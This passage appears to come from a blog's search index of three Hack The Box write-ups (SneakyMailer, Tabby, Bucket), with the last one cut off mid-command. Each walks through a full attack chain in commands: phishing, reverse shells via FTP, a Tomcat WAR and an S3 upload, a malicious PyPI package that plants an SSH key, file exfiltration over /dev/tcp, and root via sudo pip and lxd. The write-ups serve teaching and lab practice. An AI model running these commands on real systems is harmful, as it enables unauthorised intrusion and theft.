CPE: cpe:/o:linux:linux_kernel With an initial scan, nmap discovered seven ports open and also identified the services behind them.\nI’ll summarize the result:\n There is an FTP service on port 21, but nmap shows no sign that anonymous login is allowed. An SSH service on port 22 Three email protocols, SMTP on port 25, IMAP on port 143 and secure IMAP on port 993 And a web server hosting two sites on port 80 and 8080. nmap identifies the hostname as sneakycorp.htb.  I’ll add sneakycorp.htb to my /etc/hosts file:\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo \u0026#39;10.10.10.197 sneakycorp.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts Enumeration TCP 80 - Website Visiting sneakycorp.htb on port 80 displays a project dashboard for a company called SneakyCorp. One project is marked as \u0026ldquo;Complete!\u0026rdquo; while the other one seems still in progress for about 80%.\nClicking on the \u0026ldquo;Team\u0026rdquo; menu points to/team.php. This page shows a table contains the employees' data of SneakyCorp.\nI saved the whole table data and stored it in a file called team.\nI can grab the emails using the grep and tr command as follows:\n→ root@iamf «sneakymailer» «10.10.14.42» $ cat team | egrep -o \u0026#34;[^[:space:]]+@[^[:space:]]+\u0026#34; | tr -d \u0026#34;\u0026lt;\u0026gt;\u0026#34; | tee emails.list I ran gobuster but it didn\u0026rsquo;t show any interesting results.\nTCP 8080 — Website It returns the default Nginx page.\nTCP 25 — SMTP (Mail) I tried to send an email, and it got queued.\nGiven a list of email addresses, the box title, as well as the illustration, I can guess it has something to do with email phishing.\nEmail Phishing I\u0026rsquo;ll setup netcat listener on port 80, and then I\u0026rsquo;ll use a tool called swaks to send an email containing my IP address to all the email addresses I\u0026rsquo;ve got.\n→ root@iamf «sneakymailer» «10.10.14.42» $ swaks --server \u0026#39;10.10.10.197\u0026#39; --to `cat emails.list | tr \u0026#39;\\n\u0026#39; \u0026#39;,\u0026#39;` --from admin@sneakymailer.htb --body \u0026#34;http://10.10.14.42/\u0026#34; And there is an HTTP POST request coming to my listener.\nThe request body contains this data.\nfirstName=Paul\u0026amp;lastName=Byrd\u0026amp;email=paulbyrd%40sneakymailer.htb\u0026amp;password=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt\u0026amp;rpassword=%5E%28%23J%40SkFv2%5B%25KhIxKk%28Ju%60hqcHl%3C%3AHt It can be decoded using an online url decoder.\nfirstName=Paul\u0026amp;lastName=Byrd\u0026amp;email=paulbyrd@sneakymailer.htb\u0026amp;password=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u0026lt;:Ht\u0026amp;rpassword=^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u0026lt;:Ht The parameter password and rpassword seem juicy where the r might refer to reset or retype the password. Unfortunately, the password doesn\u0026rsquo;t work on SSH and FTP.\nTCP 143 - IMAP With the obtained credentials, I can try to use it on IMAP, but since Kali doesn’t have any builtin mail apps, I\u0026rsquo;ll need an email client, and I end up with sylpheed. You can install it with sudo apt-get install sylpheed.\nBut before moving on, I\u0026rsquo;ll add sneakymailer.htb to my/etc/hosts file to avoid problems with dns/name resolution.\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo \u0026#39;10.10.10.197 sneakymailer.htb\u0026#39; \u0026gt;\u0026gt; /etc/hosts Initial Setup As this is my first install, I\u0026rsquo;ll have to determine the location of the mailbox (storage) for receiving email from the mail server. I decided to put it on/root/sneaky/loot/Mail.\nNext I\u0026rsquo;ll have to determine the account type. Because the box only has IMAP listening and we\u0026rsquo;re not going outside VPN connection, then I should choose IMAP4.\nIn the following section, I\u0026rsquo;ll use the display name Paul and the email address paulbyrd@sneakymailer.htb that I obtained through phishing.\nI lost some screenshots after the step above, but here is the final configuration.\nLastly, enter paulbyrd\u0026rsquo;s password, ^(#J@SkFv2[%KhIxKk(Ju`hqcHl\u0026lt;:Ht, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.\nRetrieving the emails In Paul\u0026rsquo;s mailbox, I found two emails inside the \u0026ldquo;Sent Items\u0026rdquo; folder.\nThe first email was sent with the subject of \u0026ldquo;Password Reset\u0026rdquo;. In this email, Paul asks the administrator to change the developer account password. I\u0026rsquo;ll grab the credentials of the developer account.\nThe second email was sent with the subject \u0026ldquo;Module testing\u0026rdquo;, but right now I\u0026rsquo;m not sure what it is about.\nFoothold Shell as www-data FTP Access The developer account can be used to access the FTP server. There is only one directory called/dev in the FTP root directory.\nI access the FTP server via browser. The files inside this FTP look the same files as the one hosted on sneakycorp.htb, except it has the additional word \u0026ldquo;dev\u0026rdquo; in the title.\nReverse Shell via FTP Upload It turns out that the developer account has write permission on the /dev directory, so I can drop a PHP reverse shell payload there.\n211-FTP server status: Connected to ::ffff:10.10.14.20 Logged in as developer TYPE: ASCII No session bandwidth limit Session timeout in seconds is 300 Control connection is plain text Data connections will be plain text At session startup, client count was 1 vsFTPd 3.0.3 - secure, fast, stable ftp\u0026gt; cd /dev 250 Directory successfully changed. ftp\u0026gt; put /shares/reversef.php iamf.php local: /shares/reversef.php remote: iamf.php 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. 72 bytes sent in 0.00 secs (2.8610 MB/s) At first I thought it was on http://sneakycorp.htb/iamf.php, the uploaded shell was available on http://dev.sneakycorp.htb/iamf.php, so I\u0026rsquo;ll have to add dev.sneakycorp.htb to my /etc/hosts.\n→ root@iamf «sneakymailer» «10.10.14.42» $ echo \u0026#39;10.10.10.194\u0026#39; \u0026gt;\u0026gt; dev.sneakycorp.htb Now I can trigger my web shell with curl.\n→ root@iamf «sneakymailer» «10.10.14.42» $ curl -s http://dev.sneakycorp.htb/iamf.php The listener has an interactive shell now.\nAfter gaining access to the box, I can re-enumerate and search for files containing sensitive data.\nPrivilege Escalation Shell as low Enumeration In /var/www, I found another subdomain. The new is pypi.sneakycorp.htb, I\u0026rsquo;ll add it to my /etc/hosts file.\nI discovered .htpasswd file inside pypi.sneakycorp.htb, which contains PyPI credentials.\nI\u0026rsquo;ll save pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/ to my note and send it to my Windows for cracking. In /home there is no user called pypi, so it might be used for something else.\nCracking Password The password can be cracked easily with John the Ripper.\nThe password is soufianeelhaoui\nMalicious PyPI package Looking into the web configuration file, pypi.sneakycorp.htb is accessible on localhost:5000.\nIt is also accessible from remote on port 8080 if I specify the hostname, pypi.sneakycorp.htb.\nRemember about the second email Paul sent to user law?\nHello low Your current task is to install, test and then erase every python module you find in our PyPI service, let me know if you have any inconvenience. Now the idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user low install the package (configured by the box\u0026rsquo;s author automatically).\nTo create a package, I\u0026rsquo;ll use the official site tutorial as my reference:\n https://packaging.python.org/tutorials/packaging-projects/ And you might want to read this too, https://packaging.python.org/specifications/pypirc/  First, I\u0026rsquo;ll get the setup.py template which looks like this:\nimport setuptools with open(\u0026#34;README.md\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as fh: long_description = fh.read() setuptools.setup( name=\u0026#34;example-pkg-YOUR-USERNAME-HERE\u0026#34;, # Replace with your own username version=\u0026#34;0.0.1\u0026#34;, author=\u0026#34;Example Author\u0026#34;, author_email=\u0026#34;author@example.com\u0026#34;, description=\u0026#34;A small example package\u0026#34;, long_description=long_description, long_description_content_type=\u0026#34;text/markdown\u0026#34;, url=\u0026#34;https://github.com/pypa/sampleproject\u0026#34;, project_urls={ \u0026#34;Bug Tracker\u0026#34;: \u0026#34;https://github.com/pypa/sampleproject/issues\u0026#34;, }, classifiers=[ \u0026#34;Programming Language :: Python :: 3\u0026#34;, \u0026#34;License :: OSI Approved :: MIT License\u0026#34;, \u0026#34;Operating System :: OS Independent\u0026#34;, ], package_dir={\u0026#34;\u0026#34;: \u0026#34;src\u0026#34;}, packages=setuptools.find_packages(where=\u0026#34;src\u0026#34;), python_requires=\u0026#34;\u0026gt;=3.6\u0026#34;, ) My goal is only to insert my SSH public key to low\u0026rsquo;s authorized_keys, so I\u0026rsquo;ll need to modify the code to this:\nimport setuptools try: with open(\u0026#34;/home/low/.ssh/authorized_keys\u0026#34;, \u0026#34;w\u0026#34;) as f: f.write(\u0026#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd\u0026#34;) f.close() except Exception as e: pass setuptools.setup( name=\u0026#34;low\u0026#34;, version=\u0026#34;0.0.1\u0026#34;, author=\u0026#34;Example Author\u0026#34;, author_email=\u0026#34;author@example.com\u0026#34;, description=\u0026#34;A small example package\u0026#34;, long_description=\u0026#34;\u0026#34;, long_description_content_type=\u0026#34;text/markdown\u0026#34;, url=\u0026#34;https://github.com/pypa/sampleproject\u0026#34;, packages=setuptools.find_packages(), classifiers=[ \u0026#34;Programming Language :: Python :: 3\u0026#34;, \u0026#34;License :: OSI Approved :: MIT License\u0026#34;, \u0026#34;Operating System :: OS Independent\u0026#34;, ], ) From the link above, in order to upload a package to the PyPI server, a file called .pypirc must be present at $HOME/.pypirc.\nThe file is required for authentication, so I\u0026rsquo;ll create one and put the PyPI credentials I obtained before.\n[distutils] index-servers = local [local] repository: http://127.0.0.1:5000 username: pypi password: soufianeelhaoui If I wanted to upload remotely, my .pypirc would look like this:\n[distutils] index-servers = remote [remote] repository: http://pypi.sneakycorp.htb:8080 username: pypi password: soufianeelhaoui I\u0026rsquo;ll transfer setup.py and .pypirc to /dev/shm of SneakyMailer via Python http server.\n→ root@iamf «exploits» «10.10.14.42» $ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.197 - - [12/Jul/2020 08:24:12] \u0026#34;GET /.pypirc HTTP/1.1\u0026#34; 200 - 10.10.10.197 - - [12/Jul/2020 08:24:29] \u0026#34;GET /setup.py HTTP/1.1\u0026#34; 200 - On SneakyMailer:\nwww-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc \u0026gt; .pypirc www-data@sneakymailer:/dev/shm$ www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py \u0026gt; setup.py Now at /dev/shm, the folder structure looks like this.\n. ├── .pypirc ├── iamf.php └── setup.py The last part is set $HOME to /dev/shm, because .pypirc should be placed at $HOME/.pypirc.\nwww-data@sneakymailer:/dev/shm$ export $HOME=/dev/shm www-data@sneakymailer:~$ After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.\nwww-data@sneakymailer:~$ python3 setup.py sdist upload -r local running sdist running egg_info writing low.egg-info/PKG-INFO writing dependency_links to low.egg-info/dependency_links.txt writing top-level names to low.egg-info/top_level.txt reading manifest file \u0026#39;low.egg-info/SOURCES.txt\u0026#39; writing manifest file \u0026#39;low.egg-info/SOURCES.txt\u0026#39; warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md running check creating low-0.0.1 creating low-0.0.1/low.egg-info copying files to low-0.0.1… copying setup.py -\u0026gt; low-0.0.1 copying low.egg-info/PKG-INFO -\u0026gt; low-0.0.1/low.egg-info copying low.egg-info/SOURCES.txt -\u0026gt; low-0.0.1/low.egg-info copying low.egg-info/dependency_links.txt -\u0026gt; low-0.0.1/low.egg-info copying low.egg-info/top_level.txt -\u0026gt; low-0.0.1/low.egg-info Writing low-0.0.1/setup.cfg Creating tar archive removing \u0026#39;low-0.0.1\u0026#39; (and everything under it) running upload Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/ Server response (200): OK WARNING: Uploading via this command is deprecated, use twine to upload instead (https://pypi.org/p/twine/) As long as I see the server response is 200, that means I have successfully uploaded the package.\nSSH Access Now I can login with my private key as user low.\n→ root@iamf «sneakymailer» «10.10.14.42» $ ssh -i id_ecdsa low@10.10.10.197 User flag is done here.\nShell as root Abusing sudo pip User low has sudo privileges on /usr/bin/pip3.\nI\u0026rsquo;ll follow the instruction from GTFOBins to abuse this circumstance to obtain the root flag.\nlow@sneakymailer:~$ TF=$(mktemp -d) low@sneakymailer:~$ low@sneakymailer:~$ echo \u0026#39;raise Exception(open(\u0026#34;/root/root.txt\u0026#34;).read())\u0026#39; \u0026gt; $TF/setup.py low@sneakymailer:~$ low@sneakymailer:~$ sudo pip3 install $TF Or to get a shell as follows:\nlow@sneakymailer:~$ TF=$(mktemp -d) low@sneakymailer:~$ low@sneakymailer:~$ echo \u0026#34;import os; os.execl(\u0026#39;/bin/sh\u0026#39;, \u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;sh \u0026lt;$(tty) \u0026gt;$(tty) 2\u0026gt;$(tty)\u0026#39;)\u0026#34; \u0026gt; $TF/setup.py low@sneakymailer:~$ low@sneakymailer:~$ sudo pip3 install $TF sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution Processing /tmp/tmp.9ShSegy5bm # whoami root # id uid=0(root) gid=0(root) groups=0(root)  References    ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-sneakymailer/","summary":"SneakyMailer is a medium difficulty Linux machine from Hack The Box. It starts by obtaining credentials through phishing attack. The credentials allows me to access one of the users' mailboxes and obtain an FTP account. Foothold on the system can be gained after dropping a reverse shell on the FTP. Internal enumeration discovers a PyPI server that can be exploited to escalate myself to user by uploading a malicious package. The user is allowed to run pip3 with sudo privileges, and this can be leveraged to obtain root access.","tags":["OSCP-like","Linux","SMTP","IMAP","Sylpheed","Phishing","Webshell","Python","PyPI","sudo","GTFObins"],"title":"HackTheBox - SneakyMailer"},{"content":"Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious .war file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box. The user is a member of the lxd group, and this group can be leveraged to gain root access.\nSkills Learned  Local File Inclusion Abusing Tomcat manager-script roles Privilege escalation with lxc/lxd group.  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux BurpSuite - https://portswigger.net/burp curl - Preinstalled in Kali Linux msfvenom - Preinstalled in Kali Linux alpine-builder - https://github.com/saghul/lxd-alpine-builder  Reconnaissance Nmap → root@iamf «tabby» «10.10.14.30» $ nmap -sC -sV -oA nmap/initial-tabby 10.10.10.194 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Mega Hosting 8080/tcp open http Apache Tomcat |_http-title: Apache Tomcat Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Jun 27 09:48:49 2020 -- 1 IP address (1 host up) scanned in 31.77 seconds An initial nmap scan discovered three open ports: 22 (SSH), 80 (HTTP), and 8080 (HTTP).\nEnumeration TCP 80 - Website Visiting port 80 shows a company website that offers hosting services called \u0026ldquo;Mega Hosting\u0026rdquo;.\nThe domain name of this site is revealed from the email address and also from the page source\nI\u0026rsquo;ll add megahosting.htb to /etc/hosts file.\n10.10.10.194 megahosting.htb The company statement about data breach points to this link http://megahosting.htb/news.php?file=statement.\nThey mentioned a tool, but I have no idea what tool it is.\nI ran gobuster but found nothing really interesting there.\nTCP 8080 - Tomcat Visiting port 8080 shows the Tomcat default page.\nBoth \u0026ldquo;manager webapp\u0026rdquo; and \u0026ldquo;host-manager webapp\u0026rdquo; are asking for credentials. I tried using Tomcat\u0026rsquo;s default credentials, but it didn\u0026rsquo;t work.\nI\u0026rsquo;ll take note on these:\n /etc/tomcat9/tomcat-users.xml \u0026ldquo;tomcat9\u0026rdquo;  Foothold Shell as tomcat Getting tomcat Credentials via LFI I found out the file parameter on http://megahosting.htb/news.php?file=statement is vulnerable to LFI.\n The LFI can be identified by assuming the website is hosted at /var/www/html/megahosting/. So the payload would be ../../../../file/to/read\n This can be leveraged to read tomcat-users.xml under /etc/tomcat9/ . But, the file is not there, it returns a blank page.\nWith basic Linux knowledge and service fingerprint from the nmap result, I can search for the exact location of the installed Tomcat.\nFirst, in Linux, every software application is most likely installed in one of the following directories:\n /usr/share/appname /usr/lib/appname /opt/appname /var/lib/appname  Second, according to the nmap result, OpenSSH version 8.2p1 and Apache version 2.4.41. Therefore, I can guess the box is most likely running Ubuntu 20.04 (Focal Fossa). Now I can just narrow the search, and find the install location of Tomcat9 on Ubuntu 20.04.\nThe search brought me to this location /usr/share/tomcat9/etc/tomcat-users.xml, and it\u0026rsquo;s the correct location.\nThe credentials is tomcat:$3cureP4s5w0rd123!\nHTML GUI - host-manager-webapp When I tried to access the host-manager-webapp with default credentials, the page says something about the roles that concerns me.\nSo, based on the tomcat-users.xml file, tomcat has two roles, admin-gui and manager-script. That means the credentials is not authorized on manager-webapp (/manager), but it will work on host-manager-webapp (/host-manager),\nAnother interesting one is, if I clicked the Server Status from /host-manager it just redirects me to http://10.10.10.194:8080/manager/status/all, and it doesn\u0026rsquo;t complain about the authorization.\nSo, I think I can access some features behind /manager/[here].\nDeploying Malicious WAR file The second role of user tomcat is manager-script. This article explains that manager-script provides all the functionality that manager-gui provides but using the text interface instead of the HTML GUI. The full documentation of what you can do with this role is available here.\nWith manager-script role, there is a deploy feature that provides the ability to deploy a java web application packaged as WAR files. I can abuse this deploy feature to deploy a malicious .war file that is embedded with JSP reverse shell.\nFirst, I\u0026rsquo;ll craft a .war file payload using msfvenom.\n→ root@iamf «tabby» «10.10.14.30» $ msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.30 lport=9000 -f war -o iamf.war Then I\u0026rsquo;ll upload the payload using curl.\n→ root@iamf «tabby» «10.10.14.30» $ curl -u \u0026#39;tomcat:$3cureP4s5w0rd123!\u0026#39; -T iamf.war http://10.10.10.194:8080/manager/text/deploy?path=/iamf.war  -u : for credential [username:password] -T : for transfer file  I\u0026rsquo;ll setup listener, and then trigger the payload also using curl.\n→ root@iamf «tabby» «10.10.14.30» $ curl http://10.10.10.194:8080/iamf.war My listener now have a shell.\nI can upgrade the shell into TTY using this trick.\n$ script /dev/null; bash Privilege Escalation Shell as ash Enumeration Manual enumeration with the find command discovered a backup file in zip format that is owned by user ash\ntomcat@tabby:/$ find / -type f -user ash 2\u0026gt;/dev/null | grep -v \u0026#39;proc\u0026#39; I\u0026rsquo;ll transfer the backup file to my Kali.\ntomcat@tabby:/$ cat /var/www/html/files/16162020_backup.zip \u0026gt; /dev/tcp/10.10.14.30/9001 And receive it on my listener.\n→ root@iamf «tabby» «10.10.14.30» $ nc -nvlp 9001 \u0026gt; 16162020_backup.zip listening on [any] 9001 ... connect to [10.10.14.30] from (UNKNOWN) [10.10.10.194] 65056 Recover Backup Password The backup file is protected by a password. I\u0026rsquo;ll try to recover the password using John the Ripper from my Windows machine, but first I\u0026rsquo;ll have to convert it to hash format using zip2john.\n→ root@iamf «tabby» «10.10.14.30» $ zip2john 16162020_backup.zip \u0026gt; backup.hash The password got cracked instantly.\njohn.exe --wordlist=rockyou.txt backup.hash The password is admin@it.\nSU - ash It turns out that the backup password is reused by ash\ntomcat@tabby:/$ su ash su ash Password: admin@it I\u0026rsquo;ll put my SSH public key to the authorized_keys file on ash home directory for better shell.\nash@tabby:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1y....H/y1qmY6ipsfAec=' \u0026gt; authorized_keys Now I can login with my key.\n→ root@iamf «tabby» «10.10.14.30» $ ssh -i id_rsa ash@10.10.10.194 ash@tabby:~$ ash@tabby:~$ sudo -l [sudo] password for ash: Sorry, user ash may not run sudo on tabby. ash@tabby:~$ id uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd) Shell as root Abusing lxc I found out that user ash is a member of the lxd group. This group can be abused by mounting the whole root file system into a container, and then I can access it freely from inside the container.\n It holds the same concept as Hack The Box - Cache (on progress..) that uses docker for the root part by mounting / (root file system) to the container and interacting with it from inside the container as a privileged user.\n I\u0026rsquo;ll use this article as reference.\nFirst, I’ll create an alpine image on my attacking machine, which is Kali Linux.\n→ root@iamf «tabby» «10.10.14.30» $ git clone https://github.com/saghul/lxd-alpine-builder → root@iamf «tabby» «10.10.14.30» $ cd lxd-alpine-builder → root@iamf «tabby» «10.10.14.30» $ ./build-alpine Once it\u0026rsquo;s done, there will be an image file called alpine-v3.12-x86_64-blablabla. In my case, it is alpine-v3.12-x86_64-20201107_1900.tar.gz. I\u0026rsquo;ll send the image to Tabby via scp.\n→ root@iamf «tabby» «10.10.14.30» $ scp -i id_rsa alpine-v3.12-x86_64-20201107_1900.tar.gz ash@10.10.10.194:/tmp I\u0026rsquo;ll initialize the lxd (storage pool, profile, etc..).\nash@tabby:~$ lxd init I\u0026rsquo;ll import the image, and then initialize the image.\nash@tabby:~$ lxc image import /tmp/alpine-v3.12-x86_64-20201107_1900.tar.gz --alias iamf-img ash@tabby:~$ ash@tabby:~$ lxc init iamf-img img-container -c security.privileged=true Next, I\u0026rsquo;ll mount the root file system of the host to the container at /mnt/root.\nash@tabby:~$ lxc config device add img-container iamf-test disk source=/ path=/mnt/root Device iamf-test added to img-container After that, I\u0026rsquo;ll start the container. I can confirm it is running using lxc ls.\nash@tabby:~$ lxc start img-container Now I can just interact with the container and grab the root flag on /mnt/root/root/root.txt\nash@tabby:~$lxc exec img-container /bin/sh Modifications on /mnt/root/ will also affect the root file system of the host. Other things I can do from the container is:\n Adding a persistent user via /etc/passwd (/mnt/root/etc/passwd) Adding a SUID bash (cp bash /mnt/root/dev/shm/bash; chmod 4755 /mnt/root/dev/shm/bash) Enabling root login and put my SSH public key to the root authorized_keys file.   References  https://blog.techstacks.com/2010/07/new-manager-roles-in-tomcat-7-are-wonderful.html https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-tabby/","summary":"Tabby is an easy Linux box that starts off by identifying and leveraging an LFI vulnerability to find tomcat credentials. The credentials can be used to gain a foothold on the system by deploying a malicious .war file via Tomcat Manager. Internal enumeration finds a password protected backup file, and it can be cracked to recover the password. The password turns out to be reused by the user on the box.","tags":["OSCP-like","Linux","LFI","Tomcat","Password-cracking","WAR-file","Container","lxc","lxd","zip2john"],"title":"HackTheBox - Tabby"},{"content":"Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is an internal web currently running as a root user, which then can be exploited to gain root access.\nSkills Learned  Pentesting AWS S3 Port Forwarding Exploiting PD4ML  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Gobuster - https://github.com/OJ/gobuster AWS CLI - https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install  Reconnaissance Nmap nmap shows two open ports: 22 (SSH) and 80 (HTTP).\n→ root@iamf «bucket» «10.10.14.39» $ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel Scanning through all the ports return the same result.\nEnumeration TCP 80 - bucket.htb Visiting this port via browser redirects to http://bucket.htb/\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://10.10.10.212 \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;302 Found\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Found\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;The document has moved \u0026lt;a href=\u0026#34;http://bucket.htb/\u0026#34;\u0026gt;here\u0026lt;/a\u0026gt;.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; I\u0026rsquo;ll add bucket.htb to /etc/hosts\n10.10.10.212 bucket.htb Now it displays a web page called \u0026ldquo;Bucket Advertising Platform\u0026rdquo;.\nInspecting the page source discovers a vhost.\nI\u0026rsquo;ll add the vhost name to /etc/hosts\n10.10.10.212 bucket.htb s3.bucket.htb Gobuster There\u0026rsquo;s no interesting results.\n→ root@iamf «bucket» «10.10.14.39» $ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80 ...\u0026lt;SNIP\u0026gt;... /index.html (Status: 200) [Size: 5344] /server-status (Status: 403) [Size: 275] TCP 80 - s3.bucket.htb Visiting the newly discovered hostname displays a typical json output format.\nGobuster gobuster scan discovers a few web paths.\n→ root@iamf «bucket» «10.10.14.39» $ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80 ...\u0026lt;SNIP\u0026gt;... /shell (Status: 200) [Size: 0] /health (Status: 200) [Size: 54] /server-status (Status: 403) [Size: 275] /shell Vising /shell redirects to http://444af250749d:4566/shell/.\nOn curl, the server returns with a bunch of HTTP headers in its response\n→ root@iamf «~» «10.10.14.51» $ curl -sv http://s3.bucket.htb/shell ...\u0026lt;SNIP\u0026gt;... \u0026lt; refresh: 0; url=http://444af250749d:4566/shell/ \u0026lt; access-control-allow-origin: * \u0026lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH \u0026lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging \u0026lt; access-control-expose-headers: x-amz-version-id \u0026lt; * Connection #0 to host s3.bucket.htb left intact I added it to /etc/hosts but it still doesn\u0026rsquo;t resolve.\n10.10.10.212 bucket.htb s3.bucket.htb 444af250749d Searching some of the header names on Google reveals those are used by Amazon S3\nAdding another / at the end of URL resolve to a DynamoDB JavaScript Shell, but I have no familiarity on this.\n/health /health is probably an endpoint to monitor the service status.\nFoothold Shell as www-data AWS S3 S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I\u0026rsquo;ll use aws cli. You can find the user guide here.\nUsage in general:\naws [options] s3 \u0026lt;subcommand\u0026gt; [parameters] I\u0026rsquo;ll start by listing the S3 bucket, but then it returns an error message.\n A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.\n → root@iamf «bucket» «10.10.14.39» $ aws s3 ls --endpoint-url=http://s3.bucket.htb You must specify a region. You can also configure your region by running \u0026#34;aws configure\u0026#34;. I can resolve the problem above by typing aws configure and fill only the default region.\n→ root@iamf «bucket» «10.10.14.39» $ aws configure AWS Access Key ID [None]: AWS Secret Access Key [None]: Default region name [None]: us-east-1 Default output format [None]: Now it works and returns a bucket called adserver.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls --endpoint-url=http://s3.bucket.htb 2020-10-21 09:16:03 adserver I can also read the objects inside adserver bucket.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver --endpoint-url=http://s3.bucket.htb PRE images/ 2020-10-21 09:22:04 5344 index.html → root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver/images/ --endpoint-url=http://s3.bucket.htb 2020-10-21 09:52:04 37840 bug.jpg 2020-10-21 09:52:04 51485 cloud.png 2020-10-21 09:52:04 16486 malware.png Those files are the same files seen in bucket.htb.\nPHP Reverse Shell upload via S3 The aws subcommand cp allows to copy a file (objects) from local to a bucket, and vice versa (source).\naws s3 cp \u0026lt;source\u0026gt; \u0026lt;target\u0026gt; [--options] Because I know the web server is Apache, I\u0026rsquo;ll create a php test files and upload it to the bucket.\n→ root@iamf «bucket» «10.10.14.39» $ echo \u0026#39;\u0026lt;?php echo \u0026#34;IamF\u0026#34; ?\u0026gt;\u0026#39; \u0026gt; iamf-test.php → root@iamf «bucket» «10.10.14.39» $ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url=http://s3.bucket.htb upload: ./iamf-test.php to s3://adserver/iamf-test.php I can confirm the file was successfully uploaded with the subcommand ls.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 ls s3://adserver/ --endpoint-url=http://s3.bucket.htb PRE images/ 2021-04-22 14:05:15 21 iamf-test.php 2021-04-22 14:05:04 5344 index.html The file is available at http://s3.bucket.htb/adserver/iamf-test.php and http://bucket.htb/iamf-test.php but the execution of php code happens on bucket.htb. A few minutes later my files got deleted, so I can guess there\u0026rsquo;s a cleanup happening.\n→ root@iamf «bucket» «10.10.14.39» $ curl -s http://s3.bucket.htb/adserver/iamf-test.php \u0026lt;?php echo \u0026#34;IamF\u0026#34; ?\u0026gt; → root@iamf «bucket» «10.10.14.39» $ curl -s http://bucket.htb/iamf-test.php IamF Now I can try to drop a PHP reverse shell.\n→ root@iamf «bucket» «10.10.14.39» $ aws s3 cp ./iamf-test.php s3://adserver/ 